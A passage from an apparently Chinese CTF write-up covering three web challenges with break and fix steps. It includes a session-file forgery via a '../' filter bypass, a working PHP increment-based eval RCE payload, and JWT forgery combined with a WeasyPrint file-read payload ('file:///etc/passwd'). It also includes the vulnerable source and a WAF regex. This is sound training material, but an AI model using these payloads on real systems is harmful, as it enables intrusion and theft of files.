class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] === <span class="hljs-literal">true</span>) : <span class="hljs-meta">?&gt;</span><br>            &lt;li&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>); <span class="hljs-meta">?&gt;</span>&lt;/li&gt; &lt;!-- Only admin can get flag --&gt;<br>        <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span> <span class="hljs-meta">?&gt;</span><br>    &lt;/ul&gt;<br>    &lt;form action=<span class="hljs-string">&quot;memo.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;compression&quot;</span>&gt;Compression method:&lt;/label&gt;<br>        &lt;select name=<span class="hljs-string">&quot;compression&quot;</span> id=<span class="hljs-string">&quot;compression&quot;</span>&gt;<br>            &lt;option value=<span class="hljs-string">&quot;none&quot;</span>&gt;None&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;gzip&quot;</span>&gt;GZIP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;bzip2&quot;</span>&gt;BZIP2&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;zip&quot;</span>&gt;ZIP&lt;/option&gt;<br>        &lt;/select&gt;<br>        &lt;button type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;backup&quot;</span> value=<span class="hljs-string">&quot;1&quot;</span>&gt;Export Backup&lt;/button&gt;<br>    &lt;/form&gt;<br>&lt;/body&gt;<br><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>1：首先很明显，当<code>$_SESSION[&#39;admin&#39;] === true</code>时就给flag，所以我们需要伪造session</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] === <span class="hljs-literal">true</span>) : <span class="hljs-meta">?&gt;</span><br>            &lt;li&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>); <span class="hljs-meta">?&gt;</span>&lt;/li&gt; &lt;!-- Only admin can get flag --&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>2：网页有个下载功能点，可以自定义后缀</p><p>但是过滤了<code>../</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">default</span>:<br>    <span class="hljs-comment">// I don&#x27;t know what extension this is, but I&#x27;ll still give you the file. Don&#x27;t plaany tricks, okay~</span><br>    <span class="hljs-variable">$compressedData</span> = <span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-variable">$backupMemos</span>);<br>    <span class="hljs-variable">$filename</span> .= <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$compressionMethod</span>;<br>    <span class="hljs-variable">$mimeType</span> = <span class="hljs-string">&#x27;text/plain&#x27;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$filename</span>);<br>    &#125;<br>    <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>3：接着<code>file_put_contents</code>写到<code>/tmp</code>目录下，格式为<code>用户名_随机数.文件后缀</code>，其中用户名和文件后缀是可控的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$random</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">8</span>));<br><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;/tmp/&#x27;</span> . <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] . <span class="hljs-string">&#x27;_&#x27;</span> . <span class="hljs-variable">$random</span>;<br><span class="hljs-variable">$compressionMethod</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;compression&#x27;</span>] ?? <span class="hljs-string">&#x27;none&#x27;</span>;<br><span class="hljs-variable">$filename</span> .= <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$compressionMethod</span>;<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$compressedData</span>);<br><span class="hljs-comment">// Send headers and output file content</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Description: File Transfer&#x27;</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: &#x27;</span> . <span class="hljs-variable">$mimeType</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filename</span>));<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filename</span>);<br></code></pre></td></tr></table></figure><p>根据第二点和第三点可以得知，当传<code>compression</code>值为<code>./</code>时，与前面的<code>.</code>组合变成<code>../</code>，然后被替换成空，就可以修改文件格式为<code>用户名_随机数</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-BabyMemo-1.png"></p><p>而在php中，session文件默认位置是<code>/tmp/sess_PHPSESSID</code>，那么我们就可以把伪造的内容写入文件，然后设置<code>PHPSESSID</code>去访问</p><p>本题用的解析引擎是默认的<code>php</code>，格式为<code>键名 + 竖线 + 经过serialize()函数序列化处理的值</code>，例如<code>username|s:1:&quot;q&quot;;memos|a:1:&#123;i:0;s:1:&quot;a&quot;;&#125;</code></p><p>我们可以伪造一个<code>admin|b:1;username|s:5:&quot;admin&quot;;</code>，注意代码中还有一层<code>str_rot13</code>，变成<code>nqzva|o:1;hfreanzr|f:5:&quot;nqzva&quot;;</code></p><p>然后用<code>sess</code>登录后写入进memos</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-BabyMemo-2.png"></p><p>设置后缀为<code>./</code>，写入到<code>sess_46364caa4533f999</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-BabyMemo-3.png"></p><p>设置<code>PHPSESSID</code>为<code>46364caa4533f999</code>访问拿到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-BabyMemo-4.png"></p><h2 id="Fix-2"><a href="#Fix-2" class="headerlink" title="Fix"></a>Fix</h2><p>我的修法应该是非预期了</p><p>直接修改读flag的命令就过了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] === <span class="hljs-literal">true</span>) : <span class="hljs-meta">?&gt;</span><br>            &lt;li&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat flag&quot;</span>); <span class="hljs-meta">?&gt;</span>&lt;/li&gt; &lt;!-- Only admin can get flag --&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>正常可以设置一个判断，使用户不能等于<code>sess</code>或者在后缀处加个白名单等等</p><h1 id="web-fuzee-rce"><a href="#web-fuzee-rce" class="headerlink" title="web-fuzee_rce"></a>web-fuzee_rce</h1><h2 id="Break-3"><a href="#Break-3" class="headerlink" title="Break"></a>Break</h2><p>弱口令<code>admin/admin123</code>直接登录后跳转到<code>goods.php</code>，然后就是一片空白，当时比赛时尝试了几个常见的参数，都没试出来就放弃了，在Fix阶段看到源码后没想到参数是<code>w1key</code></p><p>传参后拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> (<span class="hljs-string">&quot;check.php&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w1key&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$w1key</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w1key&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$w1key</span>) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$w1key</span>) == <span class="hljs-variable">$w1key</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$w1key</span>) &lt;= <span class="hljs-number">3</span> &amp;&amp; <span class="hljs-variable">$w1key</span> &gt; <span class="hljs-number">999999999</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;good&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Please input a valid number!&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;w1key&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$w1key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;w1key&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">strCheck</span>(<span class="hljs-variable">$w1key</span>);<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$w1key</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>Please input a valid number!<br></code></pre></td></tr></table></figure><p>第一个if没啥用，要过的话用科学计数法就行</p><p>第二个if存在一个代码执行，但是有个waf，会过滤一些字符，同时存在长度限制</p><p>先fuzz看下能用的符号</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-fuzee_rce-1.png"></p><p>可以用自增rce</p><p><code>w1key=$%ff=_(%ff/%ff)[%ff];$_=%2b%2b$%ff;$_=_.%2b%2b$%ff.$_;$%ff%2b%2b;$%ff%2b%2b;$_.=%2b%2b$%ff.%2b%2b$%ff;$$_[_]($$_[%ff]);&amp;_=system&amp;%ff=ls</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-fuzee_rce-2.png"></p><h2 id="Fix-3"><a href="#Fix-3" class="headerlink" title="Fix"></a>Fix</h2><p>比赛时修的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">strCheck</span>(<span class="hljs-params"><span class="hljs-variable">$w1key</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$w1key</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$w1key</span>) &lt;= <span class="hljs-number">83</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[1-9a-zA-Z!,()\[\]\/%+@&#x27;#^&amp;%*:\.&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-variable">$w1key</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$w1key</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;黑客是吧，我看你怎么黑！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了&quot;</span>);<br>      &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="web-Oh-My-PDF"><a href="#web-Oh-My-PDF" class="headerlink" title="web-Oh! My PDF"></a>web-Oh! My PDF</h1><h2 id="Break-4"><a href="#Break-4" class="headerlink" title="Break"></a>Break</h2><blockquote><p>忘记当时有没有给源码了，就先当没有源码来分析吧</p></blockquote><p>有个注册和登录功能，主页面的功能是访问提供的url并转成pdf然后下载</p><p>随意注册一个账号登录后提示需要是admin权限才能操作</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-OhMyPDF-1.png"></p><p>抓包发现使用了jwt，尝试空密钥直接修改isadmin的值后成功绕过</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-OhMyPDF-2.png"></p><p>然后是主功能点，试了下不能使用类似<code>file://</code>的协议，只能使用<code>http://</code><br>在vps上开个监听，访问后可以看到<code>WeasyPrint</code>库的特征</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-OhMyPDF-3.png"></p><p>这个爬虫虽然不会渲染js，但是却可以解析<code>&lt;link attachment=xxx&gt;</code>，因此我们可以在vps上构造payload： <code>&lt;link rel=&quot;attachment&quot; href=&quot;file:///etc/passwd&quot;&gt;</code>来实现任意文件读取</p><p>例如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;attachment&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后去访问这个页面，返回一个pdf，用binwalk提取就能看到文件内容了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-OhMyPDF-4.png"></p><h2 id="Fix-4"><a href="#Fix-4" class="headerlink" title="Fix"></a>Fix</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, make_response, render_template, flash, redirect, url_for<br><span class="hljs-keyword">from</span> flask_sqlalchemy <span class="hljs-keyword">import</span> SQLAlchemy<br><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlsplit<br><span class="hljs-keyword">from</span> flask_weasyprint <span class="hljs-keyword">import</span> HTML, render_pdf<br><span class="hljs-keyword">from</span> werkzeug.security <span class="hljs-keyword">import</span> generate_password_hash, check_password_hash<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">10</span>)<br>app.config[<span class="hljs-string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = <span class="hljs-string">&#x27;sqlite:///users.db&#x27;</span><br><br>db = SQLAlchemy(app)<br><br>URL_REGEX = re.<span class="hljs-built_in">compile</span>(<br>    <span class="hljs-string">r&#x27;http(s)?://&#x27;</span>  <span class="hljs-comment"># http or https</span><br>    <span class="hljs-string">r&#x27;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#x27;</span><br>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(db.Model):<br>    <span class="hljs-built_in">id</span> = db.Column(db.Integer, primary_key=<span class="hljs-literal">True</span>)<br>    username = db.Column(db.String(<span class="hljs-number">80</span>), unique=<span class="hljs-literal">True</span>, nullable=<span class="hljs-literal">False</span>)<br>    password = db.Column(db.String(<span class="hljs-number">80</span>), nullable=<span class="hljs-literal">False</span>)<br>    is_admin = db.Column(db.Boolean, nullable=<span class="hljs-literal">False</span>, default=<span class="hljs-literal">False</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_database</span>(<span class="hljs-params">app</span>):<br>    <span class="hljs-keyword">with</span> app.app_context():<br>        db.create_all()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_valid_url</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> URL_REGEX.match(url):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            data = request.form<br>            hashed_password = generate_password_hash(data[<span class="hljs-string">&#x27;password&#x27;</span>])<br>            new_user = User(username=data[<span class="hljs-string">&#x27;username&#x27;</span>], password=hashed_password, is_admin=<span class="hljs-literal">False</span>)<br>            db.session.add(new_user)<br>            db.session.commit()<br><br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>,message=<span class="hljs-string">&#x27;User registered successfully&#x27;</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>,message=<span class="hljs-string">&#x27;Register Error!&#x27;</span>),<span class="hljs-number">500</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>,message=<span class="hljs-string">&#x27;please register first!&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        data = request.form<br>        user = User.query.filter_by(username=data[<span class="hljs-string">&#x27;username&#x27;</span>]).first()<br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">and</span> check_password_hash(user.password, data[<span class="hljs-string">&#x27;password&#x27;</span>]):<br>            access_token = jwt.encode(<br>                &#123;<span class="hljs-string">&#x27;username&#x27;</span>: user.username, <span class="hljs-string">&#x27;isadmin&#x27;</span>:<span class="hljs-literal">False</span>&#125;, app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="hljs-string">&quot;HS256&quot;</span>)<br>            res = make_response(redirect(url_for(<span class="hljs-string">&#x27;ohmypdf&#x27;</span>)))<br>            res.set_cookie(<span class="hljs-string">&#x27;access_token&#x27;</span>,access_token)<br>            <span class="hljs-keyword">return</span> res, <span class="hljs-number">200</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>,message=<span class="hljs-string">&#x27;Invalid username or password&#x27;</span>), <span class="hljs-number">500</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>), <span class="hljs-number">200</span><br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ohmypdf</span>():<br>    access_token = request.cookies.get(<span class="hljs-string">&#x27;access_token&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> access_token:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;login&quot;</span>))<br><br>    <span class="hljs-keyword">try</span>:<br>        decoded_token = jwt.decode(<br>            access_token, app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="hljs-string">&quot;HS256&quot;</span>],options=&#123;<span class="hljs-string">&quot;verify_signature&quot;</span>: <span class="hljs-literal">False</span>&#125;)<br>        isadmin = decoded_token[<span class="hljs-string">&#x27;isadmin&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>,message=<span class="hljs-string">&#x27;Invalid access token&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> isadmin:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,message=<span class="hljs-string">&#x27;You do not have permission to access this resource. Where is the admin?!&#x27;</span>), <span class="hljs-number">403</span><br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        url = request.form.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>        <span class="hljs-keyword">if</span> is_valid_url(url):<br>            <span class="hljs-keyword">try</span>:<br>                html = HTML(url=url)<br>                pdf = html.write_pdf()<br>                response = make_response(pdf)<br>                response.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;application/pdf&#x27;</span><br>                response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=output.pdf&#x27;</span><br>                <span class="hljs-keyword">return</span> response<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Error generating PDF&#x27;</span>, <span class="hljs-number">500</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Invalid URL!&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>), <span class="hljs-number">200</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    create_database(app)<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br></code></pre></td></tr></table></figure><p>看下代码中关于jwt的部分，可以从这部分入手</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">10</span>)<br><br>access_token = jwt.encode(<br>                &#123;<span class="hljs-string">&#x27;username&#x27;</span>: user.username, <span class="hljs-string">&#x27;isadmin&#x27;</span>:<span class="hljs-literal">False</span>&#125;, app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="hljs-string">&quot;HS256&quot;</span>)<br><br><br>decoded_token = jwt.decode(<br>            access_token, app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="hljs-string">&quot;HS256&quot;</span>],options=&#123;<span class="hljs-string">&quot;verify_signature&quot;</span>: <span class="hljs-literal">False</span>&#125;)<br>isadmin = decoded_token[<span 